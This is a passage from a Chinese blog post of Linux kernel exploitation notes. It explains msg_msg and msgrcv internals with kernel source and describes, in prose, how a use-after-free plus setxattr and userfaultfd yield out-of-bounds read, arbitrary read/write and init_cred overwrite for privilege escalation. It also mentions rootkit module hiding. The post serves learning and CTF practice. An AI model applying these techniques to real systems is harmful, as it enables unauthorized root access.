atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">            atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">            ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">    ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">    wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//如果存在copy副本,那么就free掉copy副本,然后返回,而不会free掉原本的msg堆块</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">        free_copy(copy);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这个msg_handler函数指针即为传入的do_msg_fill()函数,从里面进行相关的数据复制</span></span><br><span class="line">    bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">    <span class="comment">//最后在这里进行相关堆块的释放</span></span><br><span class="line">    free_msg(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h5 id="A-非堆块释放的数据读取"   >
          <a href="#A-非堆块释放的数据读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-非堆块释放的数据读取" class="headerlink" title="A.非堆块释放的数据读取"></a>A.非堆块释放的数据读取</h5>
      <p>一般而言，我们使用<code>msg_msg</code>进行堆构造（比如溢出或者其他什么的）的时候，当需要从消息队列中读取消息而又不想释放该堆块时，会结合<code>MSG_COPY</code>这个<code>msgflg</code>标志位，防止在读取的时候发生堆块释放从而进行双向循环链表的<code>unlink</code>触发错误。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 do_msgrcv()函数中的</span></span><br><span class="line"><span class="comment">/* If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">    * not update queue parameters.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面是unlink的部分,如果msg_msg结构被修改了可能会出错的</span></span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line">msq-&gt;q_qnum--;</span><br><span class="line">msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br></pre></td></tr></table></div></figure>

<p>使用这个标志位还需要在内核编译的时候设置<code>CONFIG_CHECKPOINT_RESTORE=y</code>才行，否则还是会出错的</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//正常的一些数据复制</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">//如果没有设置CONFIG_CHECKPOINT_RESTORE=y则会出错</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(-ENOSYS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>🔺注：还有一点不知道是不是什么bug，在某些内核版本中，至少我的<code>v5.11</code>中，<code>MSG_NOERROR</code>和<code>MSG_COPY</code>（后续会讲到）没有办法同时生效，关键点在于<code>copy_msg()</code>函数中，转化成汇编如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png" alt="image-20220512163536660"></p>
<p>注意到红框的部分，获取<code>rdi(msg)</code>和<code>rsi(copy)</code>对应的<code>m_ts</code>进行比较，而<code>copy</code>的<code>m_ts</code>是从用户传进来的想要获取消息的长度，如果小于实际的<code>msg</code>的<code>m_ts</code>长度，那就标记错误然后退出。可以这个比较应该是在后面才会进行的，但是这里也突然冒出来，就很奇怪，导致这两个标志位没办法同时发挥作用。</p>

        <h5 id="B-释放堆块的消息读取"   >
          <a href="#B-释放堆块的消息读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-释放堆块的消息读取" class="headerlink" title="B.释放堆块的消息读取"></a>B.释放堆块的消息读取</h5>
      <p>同理如果不指定<code>MSG_COPY</code>这个标志时，从消息队列中读取消息就会触发内存释放，这里就可以依据发送消息时设置的<code>mtype</code>和接收消息时设置的<code>msgtpy</code>来进行消息队列中各个位置的堆块的释放。</p>

        <h5 id="C-数据复制"   >
          <a href="#C-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-数据复制" class="headerlink" title="C.数据复制"></a>C.数据复制</h5>
      <p>不管什么标志位，只要不是<code>MSG_NOERROR</code>和<code>MSG_COPY</code>联合起来，并且申请读取消息长度<code>size</code>小于通过<code>find_msg()</code>函数获取到的实际消息的<code>m_ts</code>，那么最终都会走到do_msgrcv()函数的末尾，通过如下代码进行数据复制和堆块释放</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-利用-1"   >
          <a href="#3-利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用-1" class="headerlink" title="(3)利用"></a>(3)利用</h3>
      
        <h4 id="越界读取"   >
          <a href="#越界读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#越界读取" class="headerlink" title="越界读取"></a>越界读取</h4>
      <p>这样，当我们通过之前提到的<code>double-free/UAF</code>，并且再使用<code>setxattr</code>来对<code>msg_msgmsg</code>中的<code>m_ts</code>进行修改，这样在我们调用<code>msgrcv</code>的时候就能越界从堆上读取内存了，就可能能够泄露到堆地址或者程序基地址。</p>
<p><strong>使用<code>setxattr</code>的时候需要注意释放堆块时FD的位置，不同内核版本开启不同保护下FD的位置不太一样</strong></p>
<p>为了获取到地址的成功性更大，我们就需要用到单个<code>msg_queue</code>和单个<code>msg_msg</code>的内存模型</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png" alt="image-20220511113542467"></p>
<p>可以看到单个<code>msg_msg</code>在<code>msg_queue</code>的管理下形成双向循环链表，所以如果我们通过<code>msgget</code>和<code>msgsnd</code>多申请一些相同大小的且只有一个<code>msg_msg</code>结构体的<code>msg_queue</code>，那么越界读取的时候，就可以读取到只有单个<code>msg_msg</code>的头部了</p>
<p>而单个<code>msg_msg</code>由于双向循环链表，其头部中又存在指向<code>msg_queue</code>的指针，那么这样就能泄露出<code>msg_queue</code>的堆地址了。</p>

        <h4 id="任意读取"   >
          <a href="#任意读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#任意读取" class="headerlink" title="任意读取"></a>任意读取</h4>
      <p>完成上述泄露<code>msg_queue</code>的堆地址之后，就需要用到<code>msg_msg</code>的内存布局了</p>
<p>由于我们的<code>msg_msg</code>消息的内存布局如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png" alt="5IcVxRaFQtg3HCW"></p>
<p>相关读取源码如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.9----ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">store_msg</span><span class="params">(<span class="keyword">void</span> __user *dest, struct msg_msg *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="keyword">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>所以如果我们可以修改<code>next</code>指针和<code>m_ts</code>，结合读取<code>msg</code>最终调用函数<code>store_msg</code>的源码，那么就能够实现任意读取。</p>
<p>那么接着上面的，我们得到<code>msg_queue</code>之后，可以再将<code>msg_msg</code>的next指针指回<code>msg_queue</code>，读出其中的<code>msg_msg</code>，就能获得当前可控堆块的堆地址。</p>
<p>这样完成之后，我们结合<code>userfaultfd</code>和<code>setxattr</code>频繁修改next指针就能基于当前堆地址来进行内存搜索了，从而能够完成地址泄露。</p>
<p>同时需要注意的是，判断链表是否结束的依据为next是否为null，所以我们任意读取的时候，最好找到一个地方的next指针处的值为null。</p>

        <h4 id="任意写"   >
          <a href="#任意写" class="heading-link"><i class="fas fa-link"></i></a><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h4>
      <p>同样的，<code>msg_msg</code>由于next指针的存在，结合<code>msgsnd</code>也具备任意地址写的功能。我们可以在拷贝的时候利用<code>userfaultfd</code>停下来，然后更改next指针，使其指向我们需要的地方，比如<code>init_cred</code>结构体位置，从而直接修改进行提权。</p>

        <h1 id="十、常见函数总结"   >
          <a href="#十、常见函数总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、常见函数总结" class="headerlink" title="十、常见函数总结"></a>十、常见函数总结</h1>
      
        <h2 id="printk"   >
          <a href="#printk" class="heading-link"><i class="fas fa-link"></i></a><a href="#printk" class="headerlink" title="printk:"></a><code>printk</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printk(日志级别 <span class="string">&quot;消息文本&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>其中日志级别定义如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#defineKERN_EMERG <span class="string">&quot;&lt;0&gt;&quot;</span><span class="comment">/*紧急事件消息，系统崩溃之前提示，表示系统不可用*/</span></span><br><span class="line">#defineKERN_ALERT <span class="string">&quot;&lt;1&gt;&quot;</span><span class="comment">/*报告消息，表示必须立即采取措施*/</span></span><br><span class="line">#defineKERN_CRIT <span class="string">&quot;&lt;2&gt;&quot;</span><span class="comment">/*临界条件，通常涉及严重的硬件或软件操作失败*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_ERR <span class="meta-string">&quot;&lt;3&gt;&quot;</span><span class="comment">/*错误条件，驱动程序常用KERN_ERR来报告硬件的错误*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_WARNING <span class="meta-string">&quot;&lt;4&gt;&quot;</span><span class="comment">/*警告条件，对可能出现问题的情况进行警告*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_NOTICE <span class="meta-string">&quot;&lt;5&gt;&quot;</span><span class="comment">/*正常但又重要的条件，用于提醒。常用于与安全相关的消息*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_INFO <span class="meta-string">&quot;&lt;6&gt;&quot;</span><span class="comment">/*提示信息，如驱动程序启动时，打印硬件信息*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_DEBUG <span class="meta-string">&quot;&lt;7&gt;&quot;</span><span class="comment">/*调试级别的消息*/</span></span></span><br></pre></td></tr></table></div></figure>


        <h2 id="kmalloc"   >
          <a href="#kmalloc" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmalloc" class="headerlink" title="kmalloc:"></a><code>kmalloc</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br></pre></td></tr></table></div></figure>

<p>其中flags一般设置为GFP_KERNEL或者GFP_DMA，在堆题中一般就是</p>
<p>GFP_KERNEL模式，如下：</p>
<p>　|– 进程上下文，可以睡眠　　　　　GFP_KERNEL<br>　|– 进程上下文，不可以睡眠　　　　GFP_ATOMIC<br>　|　　|– 中断处理程序　　　　　　　GFP_ATOMIC<br>　|　　|– 软中断　　　　　　　　　　GFP_ATOMIC<br>　|　　|– Tasklet　　　　　　　　　GFP_ATOMIC<br>　|– 用于DMA的内存，可以睡眠　　　GFP_DMA | GFP_KERNEL<br>　|– 用于DMA的内存，不可以睡眠　　GFP_DMA <strong>|GFP_ATOMIC</strong></p>
<p>具体可以看</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/sky-heaven/p/7390370.html" >Linux内核空间内存申请函数kmalloc、kzalloc、vmalloc的区别【转】 - sky-heaven - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><code>kzmalloc</code>类似，就是分配空间并且内存初始化为0</p>

        <h2 id="kfree"   >
          <a href="#kfree" class="heading-link"><i class="fas fa-link"></i></a><a href="#kfree" class="headerlink" title="kfree:"></a><code>kfree</code>:</h2>
      <p>这个就不多说了，就是简单的释放。</p>

        <h2 id="copy-from-user"   >
          <a href="#copy-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-from-user" class="headerlink" title="copy_from_user:"></a><code>copy_from_user</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></div></figure>


        <h2 id="copy-to-user"   >
          <a href="#copy-to-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#copy-to-user" class="headerlink" title="copy_to_user:"></a><code>copy_to_user</code>:</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_to_user(<span class="keyword">void</span> __user *to, <span class="keyword">const</span> <span class="keyword">void</span> *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></div></figure>

<p>这两个就不讲了，顾名思义。</p>

        <h1 id="十一、其他知识"   >
          <a href="#十一、其他知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、其他知识" class="headerlink" title="十一、其他知识"></a>十一、其他知识</h1>
      
        <h2 id="1-内核模块隐藏"   >
          <a href="#1-内核模块隐藏" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-内核模块隐藏" class="headerlink" title="1.内核模块隐藏"></a>1.内核模块隐藏</h2>
      <p>不知道为啥，这里不成功，显示</p>
<p><code> Unknown symbol module_mutex (err 0)</code></p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246749#h3-7" >简易 Linux Rootkit 编写入门指北（一）：模块隐藏与进程提权 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="2-文件系统"   >
          <a href="#2-文件系统" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-文件系统" class="headerlink" title="2.文件系统"></a>2.文件系统</h2>
      
        <h3 id="1-SRV4文件系统"   >
          <a href="#1-SRV4文件系统" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SRV4文件系统" class="headerlink" title="(1)SRV4文件系统"></a>(1)SRV4文件系统</h3>
      <p>也就是常见的cpio后缀的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330101231165.png" alt="image-20220330101231165"></p>
<p>这个直接常用解包打包即可</p>

        <h3 id="2-ext4文件系统"   >
          <a href="#2-ext4文件系统" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ext4文件系统" class="headerlink" title="(2)ext4文件系统"></a>(2)ext4文件系统</h3>
      <p>linux下挂载修改即可</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mount rootfs.ext4 mountpoint/</span><br><span class="line"><span class="built_in">cd</span> mountpoint/</span><br><span class="line"><span class="comment">#change somethin</span></span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">sudo umount ./mountpoint</span><br></pre></td></tr></table></div></figure>

<p>常见的init启动脚本在<code>/etc/init.d/rcS</code>中</p>

        <h2 id="3-设备操作"   >
          <a href="#3-设备操作" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-设备操作" class="headerlink" title="3.设备操作"></a>3.设备操作</h2>
      <ul>
<li>获取设备信息</li>
</ul>
<p>通过命令<code>udevadm info -a -n /dev/tty</code>获取相关设备信息</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171652853.png" alt="image-20220330171652853"></p>
<ul>
<li>修改设备权限</li>
</ul>
<p>当我们无法对设备进行操作时，可能是被设置了权限，可以通过<code>/etc/udev/rules.d/</code>下查看设置的一些规则</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171342307.png"></p>
<p>查看相关的内容，即指定相关设备后可以设置其类似用户组<code>GROUP</code>或者权限<code>MODE</code>等内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171405407.png" alt="image-20220330171405407"></p>
<ul>
<li>读取</li>
</ul>
<p>直接<code>cat /dev/DEV_NAME</code>相当于<code>open_read_close</code>这个设备</p>

        <h2 id="4-获取内核符号"   >
          <a href="#4-获取内核符号" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-获取内核符号" class="headerlink" title="4.获取内核符号"></a>4.获取内核符号</h2>
      <p>当我们拿到一个<code>bzImage</code>或者无符号的<code>vmlinux</code>文件时，想要获取符号一般只有以下两种</p>

        <h3 id="1-启动内核"   >
          <a href="#1-启动内核" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-启动内核" class="headerlink" title="(1)启动内核"></a>(1)启动内核</h3>
      <p>我们利用busybox制作文件系统，然后使用qemu加载启动内核，启动之后在<code>/proc/kallsyms</code>保存所有地址，直接cat查看即可。</p>

        <h3 id="2-使用工具"   >
          <a href="#2-使用工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-使用工具" class="headerlink" title="(2)使用工具"></a>(2)使用工具</h3>
      <p>有个工具<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，这个还是很好使的，可以直接获得带符号的<code>vmlinux</code>文件</p>

        <h2 id="5-互斥锁和信号量"   >
          <a href="#5-互斥锁和信号量" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-互斥锁和信号量" class="headerlink" title="5.互斥锁和信号量"></a>5.互斥锁和信号量</h2>
      
        <h3 id="1-互斥锁"   >
          <a href="#1-互斥锁" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-互斥锁" class="headerlink" title="(1)互斥锁"></a>(1)互斥锁</h3>
      <p>用于线程互斥，一个互斥锁的加锁和解锁必须由同一个线程执行，是为了防止对一块内存的同时读写等问题。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/mutex.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutext</span> <span class="title">mtx</span>;</span></span><br><span class="line">mutex_init(&amp;mtx);<span class="comment">//初始化互斥锁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(mutex_lock_interruptible(&amp;mtx))<span class="comment">//-EINTR(退出进程)</span></span><br><span class="line">	<span class="keyword">return</span> -ERESTARTSYS;<span class="comment">//进入等待</span></span><br><span class="line"><span class="comment">//.....//</span></span><br><span class="line">mutex_unlock(&amp;mtx);</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-信号量"   >
          <a href="#2-信号量" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-信号量" class="headerlink" title="(2)信号量"></a>(2)信号量</h3>
      <p>用于线程同步，合理使用公共资源。比如一个资源只有5份，每当一个线程获取该资源时，信号量就减一，当5个线程都获得该资源时，信号量减为0，其他线程就不能再获取该资源，处于等待状态，防止死锁。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/semaphore.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> <span class="title">sema</span>;</span></span><br><span class="line"></span><br><span class="line">sema_init(&amp;sema,<span class="number">1</span>);<span class="comment">//初始化信号量，将资源量设置为1</span></span><br><span class="line"><span class="keyword">if</span>(down_interruptible(&amp;sema))<span class="comment">//-EINTR(退出进程)</span></span><br><span class="line">	<span class="keyword">return</span> -ERESTARTSYS;<span class="comment">//进入等待</span></span><br><span class="line"><span class="comment">//......//</span></span><br><span class="line">up(&amp;sema)</span><br></pre></td></tr></table></div></figure>




        <h2 id="6-系统调用使用"   >
          <a href="#6-系统调用使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-系统调用使用" class="headerlink" title="6.系统调用使用"></a>6.系统调用使用</h2>
      
        <h3 id="1-传参约定"   >
          <a href="#1-传参约定" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-传参约定" class="headerlink" title="(1)传参约定"></a>(1)传参约定</h3>
      <ul>
<li>32位：EBX、ECX、EDX、ESI、EDI、EBP</li>
<li>64位：RDI、RSI、RDＸ、R10、R8、R9</li>
</ul>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/">http://pig-007.github.io/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/">kernel笔记汇总</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">2021HWS固件学习</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/01/09/Burpsuite%E4%BD%BF%E7%94%A8/"><span class="paginator-prev__text">Burpsuite使用</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4"><span class="toc-text">
          一、常见保护</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-KPTI"><span class="toc-text">
          1.KPTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-SMEP%E3%80%81SMAP%E3%80%81KASLR%E7%AD%89"><span class="toc-text">
          2.SMEP、SMAP、KASLR等</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMEP%E5%92%8CSMAP"><span class="toc-text">
          (1)SMEP和SMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-KASLR"><span class="toc-text">
          (2)KASLR</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96%E4%BF%9D%E6%8A%A4"><span class="toc-text">
          3.其他保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-STACK-PROTECTOR"><span class="toc-text">
          (1)STACK PROTECTOR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%82%E8%80%83README-MD"><span class="toc-text">
          (2)参考README.MD</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-text">
          二、泄露地址</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">
          1.常用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dmesg"><span class="toc-text">
